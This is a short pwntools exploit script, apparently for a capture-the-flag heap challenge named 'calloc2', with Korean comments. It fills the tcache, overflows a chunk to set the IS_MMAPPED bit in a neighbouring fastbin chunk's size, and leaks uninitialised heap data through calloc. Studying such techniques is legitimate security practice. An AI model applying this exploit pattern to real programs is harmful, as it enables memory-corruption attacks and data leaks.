from pwn import *

p = process("./calloc2")
e = ELF("./calloc2")

def add(size):
	p.sendlineafter(b">",b"1")
	p.sendlineafter(b":",str(size).encode())
	
def free(idx):
	p.sendlineafter(b">",b"2")
	p.sendlineafter(b":",str(idx).encode())
	
def edit(idx, data):
	p.sendlineafter(b">",b"3")
	p.sendlineafter(b":",str(idx).encode())
	p.send(data)
	
def show(idx):
	p.sendlineafter(b">",b"4")
	p.sendlineafter(b":",str(idx).encode())
	p.recvuntil(b"ptr: ")
	return p.recvline()[:-1]

for i in range(0,7):
	add(0x18) # 0~6

for i in range(0,7):
	free(i)   # tcache_entry[0x30] : 0,1,2,3,4,5,6

add(0x18)     # 7
add(0x18)     # 8
add(0x18)     # 9

free(8)       # fastbin[0x30] : 8

payload = b"A"*0x10           # 7(6) 데이터 영역
payload += p64(0) + p32(0x22) # 8 헤더 -> IS_MMAPPED BIT 활성화를 위해 Size를 0x22로 설정
edit(7,payload)

add(0x18)     # 10 (8)
edit(10, b"A"*8)

print(show(10))
